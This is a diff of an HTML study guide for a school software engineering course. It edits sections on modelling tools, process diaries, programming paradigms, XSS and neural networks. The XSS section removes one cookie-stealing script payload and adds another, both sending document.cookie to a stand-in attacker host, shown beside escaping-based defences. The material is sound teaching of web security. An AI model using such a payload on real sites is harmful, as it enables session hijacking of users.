@@ -100,7 +100,7 @@
 
         <!-- 1. System and Data Modelling Tools -->
         <section id="modelling-tools">
-          <h2 class="syllabus-phase">📊 System and Data Modelling Tools</h2>
+          <h2 class="syllabus-phase">🗺️ System and Data Modelling Tools</h2>
 
           <h3>📊 Data Flow Diagrams (DFD)</h3>
           <p>Used to represent the flow of data through an information system. DFDs show <em>what</em> data moves through a system and <em>where</em> it goes — not how or when.</p>
@@ -236,6 +236,30 @@
             <li><strong>Next steps</strong> — what will be attempted in the next session</li>
             <li><strong>Reflective comments</strong> — what was learned or what could be improved</li>
           </ul>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Process Diary — Example Entry</span></div>
+            <pre><code>Date: 14 March 2025    Session duration: 90 minutes
+
+Tasks completed:
+  - Implemented the login form with input validation (Python / Flask)
+  - Updated Gantt chart: testing phase pushed back 2 days
+
+Stumbling blocks:
+  - The input sanitisation function was stripping "+" characters from
+    valid email addresses (e.g. user+tag@example.com)
+
+Solutions applied:
+  - Updated the regex to r'^[\w.+\-]+@[\w\-]+\.[\w.]+$'
+  - Verified against RFC 5321 which confirms "+" is legal in the local part
+
+Next steps:
+  - Write unit tests for the validate_email() function
+  - Begin designing the database schema
+
+Reflective comment:
+  - This bug took longer than expected. In future I should test
+    edge cases during coding rather than discovering them in testing.</code></pre>
+          </div>
           <div class="callout info">
             In the HSC Software Engineering Project, your process diary is submitted as evidence of your development approach and is assessed alongside your final solution.
           </div>
@@ -267,7 +291,7 @@ grandparent(X, Z) :-
     parent(X, Y), parent(Y, Z).</code></pre>
             </div>
             <div class="info-card">
-              <h4>📊 Imperative</h4>
+              <h4>🖥️ Imperative</h4>
               <p>Programs describe <strong>how</strong> to do something as a sequence of commands — control structures, assignment, expressions, and subroutines. Most common paradigm; used in Python, C, Pascal.</p>
               <pre style="font-size:.78rem;margin-top:.5rem"><code>total = 0
 for i in range(1, 6):
@@ -622,28 +646,33 @@ for s in passing:
 
           <h3>Cross-site scripting (XSS)</h3>
           <p>XSS is a web security vulnerability where an attacker injects malicious client-side scripts into web pages that other users then view. The injected script runs in the victim's browser with the same trust level as the legitimate site.</p>
-          <div class="code-block">
-            <div class="code-header"><span class="code-lang">XSS — Attack example</span></div>
-            <pre><code>&lt;!-- Attacker submits this as a comment/username: --&gt;
-&lt;script&gt;
-  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;
-&lt;/script&gt;
-
-&lt;!-- If the server renders it without escaping, every visitor runs the script --&gt;</code></pre>
+          <div class="callout warning">
+            <strong>Attack scenario:</strong> A forum site displays user comments without sanitising them. An attacker posts a comment containing a <code>&lt;script&gt;</code> tag. Every visitor who loads the page runs the script in their own browser — the attacker can steal session cookies, redirect users, or log keystrokes.
           </div>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">XSS Prevention — Escape output</span></div>
-            <pre><code># Python (Flask) — escape user input before rendering
-from markupsafe import escape
+            <div class="code-header"><span class="code-lang">XSS — Vulnerable vs Safe output (Python Flask)</span></div>
+            <pre><code># VULNERABLE — user input rendered directly as HTML:
+comment = request.form['comment']
+return f"&lt;p&gt;{comment}&lt;/p&gt;"
+# If comment = &lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;
+# → every visitor's cookie is sent to the attacker
 
-username = request.form['username']
-safe_name = escape(username)   # &lt;script&gt; becomes &amp;lt;script&amp;gt;
-return f"&lt;p&gt;Hello, {safe_name}&lt;/p&gt;"</code></pre>
+# SAFE — escape special characters before rendering:
+from markupsafe import escape
+safe_comment = escape(comment)
+return f"&lt;p&gt;{safe_comment}&lt;/p&gt;"
+# &lt;script&gt; becomes &amp;lt;script&amp;gt; — displayed as text, never executed</code></pre>
+          </div>
+          <div class="callout success">
+            <strong>Mitigation checklist:</strong>
+            (1) <strong>Escape output</strong> — convert <code>&lt; &gt; &amp; " '</code> to HTML entities before rendering any user-supplied content.<br>
+            (2) <strong>Validate input server-side</strong> — reject input that doesn't match an expected format or whitelist.<br>
+            (3) <strong>Content Security Policy (CSP)</strong> — set a response header restricting which scripts may execute on your page.
           </div>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Escaping output</strong><span>Convert special characters (<code>&lt; &gt; &amp; " '</code>) to their HTML entities before rendering.</span></div>
-            <div class="key-term-item"><strong>Input validation</strong><span>Reject or sanitise input that doesn't match expected formats on the server side.</span></div>
-            <div class="key-term-item"><strong>Content Security Policy</strong><span>A browser header that restricts which scripts are allowed to execute on a page.</span></div>
+            <div class="key-term-item"><strong>Escaping output</strong><span>Convert special characters (<code>&lt; &gt; &amp; " '</code>) to HTML entities so they render as text rather than being parsed as markup.</span></div>
+            <div class="key-term-item"><strong>Input validation</strong><span>Reject or sanitise input that doesn't match expected formats on the server side (never rely on client-side validation alone).</span></div>
+            <div class="key-term-item"><strong>Content Security Policy</strong><span>An HTTP response header that tells the browser which sources of script are trusted — blocking injected inline scripts even if they reach the page.</span></div>
           </div>
 
           <h3>Cascading Style Sheets (CSS)</h3>
@@ -712,12 +741,26 @@ p {
 
           <h3>Neural Networks</h3>
           <p>Computational models loosely inspired by the brain, composed of <strong>layers of interconnected nodes (neurons)</strong>. Each connection has a weight that is adjusted during training.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Neural Network — Architecture</span></div>
+            <pre><code>Input Layer          Hidden Layer 1       Hidden Layer 2       Output Layer
+(4 features)         (5 neurons)          (3 neurons)          (2 classes)
+
+  x₁ ──────────────→ ◉ ──────────────→  ◉ ──────────────→  ◉ → P(Spam)
+  x₂ ─────────╮   ╭→ ◉ ──────────╮  ╭→ ◉ ──────────╮       ◉ → P(Not Spam)
+  x₃ ────╮    ╰───╯  ◉            ╰──╯  ◉            ╰──────╯
+  x₄ ────╰─────────→ ◉ ──────────────→  ◉
+                      ◉
+
+  Each → represents a weighted connection.
+  The output layer uses softmax — probabilities sum to 1.0.</code></pre>
+          </div>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Input layer</strong><span>Receives the raw input features (e.g. pixel values of an image, or sensor readings).</span></div>
-            <div class="key-term-item"><strong>Hidden layer(s)</strong><span>One or more intermediate layers that learn to detect patterns and features. "Deep" networks have many hidden layers.</span></div>
-            <div class="key-term-item"><strong>Output layer</strong><span>Produces the final prediction — e.g. a class label, a probability, or a continuous value.</span></div>
+            <div class="key-term-item"><strong>Input layer</strong><span>Receives the raw input features (e.g. pixel values of an image, or sensor readings). One node per feature.</span></div>
+            <div class="key-term-item"><strong>Hidden layer(s)</strong><span>One or more intermediate layers that learn to detect patterns automatically. "Deep learning" refers to networks with many hidden layers.</span></div>
+            <div class="key-term-item"><strong>Output layer</strong><span>Produces the final prediction. For binary classification: 1 node. For n classes: n nodes. For regression: 1 node (continuous value).</span></div>
             <div class="key-term-item"><strong>Weights &amp; biases</strong><span>Numerical parameters on each connection; adjusted during training to minimise prediction error.</span></div>
-            <div class="key-term-item"><strong>Activation function</strong><span>Introduces non-linearity at each neuron (e.g. ReLU, Sigmoid) so the network can model complex patterns.</span></div>
+            <div class="key-term-item"><strong>Activation function</strong><span>Introduces non-linearity at each neuron (e.g. ReLU, Sigmoid) — without it, deep networks reduce to simple linear regression.</span></div>
           </div>
 
           <h4>Training cycle</h4>
